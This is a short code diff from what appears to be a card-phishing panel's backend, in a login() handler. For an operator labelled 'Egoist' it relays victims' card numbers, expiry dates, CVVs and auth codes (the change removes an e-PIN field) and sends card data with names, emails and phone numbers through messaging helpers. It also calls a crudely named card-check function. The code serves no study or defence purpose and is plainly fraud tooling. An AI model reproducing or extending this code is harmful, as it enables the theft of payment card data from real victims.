@@ -62,7 +62,7 @@ def login():
     # Egoist
     elif id == '1000002':
         if authCode != None and authCode != 'None':
-            send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin, ID)
+            send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
             return ''
         ne_pizdabol(card_number)
         send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel)
